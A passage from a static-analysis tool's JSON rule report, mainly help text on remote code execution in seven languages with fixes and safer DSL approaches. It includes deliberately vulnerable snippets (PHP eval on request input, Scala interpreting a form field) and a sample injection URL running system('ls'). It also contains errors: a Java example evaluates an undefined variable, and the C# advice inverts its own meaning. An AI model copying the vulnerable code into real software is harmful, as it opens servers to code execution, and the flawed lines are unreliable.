                                "markdown": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**",
                                "text": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/451ef41a63c648dd04d1764fbb4d03fac43287aca4b34495a8e47a4de7f79400",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
